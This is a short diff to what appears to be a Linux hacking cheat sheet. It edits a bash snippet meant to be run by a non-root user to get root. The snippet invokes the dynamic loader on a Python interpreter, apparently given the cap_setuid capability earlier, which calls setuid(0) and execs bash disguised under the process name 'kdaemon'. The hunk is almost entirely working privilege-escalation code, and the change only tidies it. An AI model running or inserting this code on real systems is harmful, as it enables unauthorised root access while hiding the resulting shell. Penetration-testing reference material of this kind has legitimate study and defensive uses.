@@ -1637,8 +1637,7 @@ setcap cap_setuid+ep "${fn}"
 ```bash
 ### Execute as non-root user to get root
 fn="$(readlink -f /lib64/ld-*.so.*)" || fn="$(readlink -f /lib/ld-*.so.*)" || fn="/lib/ld-linux.so.2"
-p="python"
-command -v python3 >/dev/null && p="python3"
+p="$(command -v python3 2>/dev/null)" || p="$(command -v python)"
 exec "${fn:?}" "$p" -c 'import os;os.setgid(0);os.setuid(0);os.execlp("bash", "kdaemon")'
 ```
 
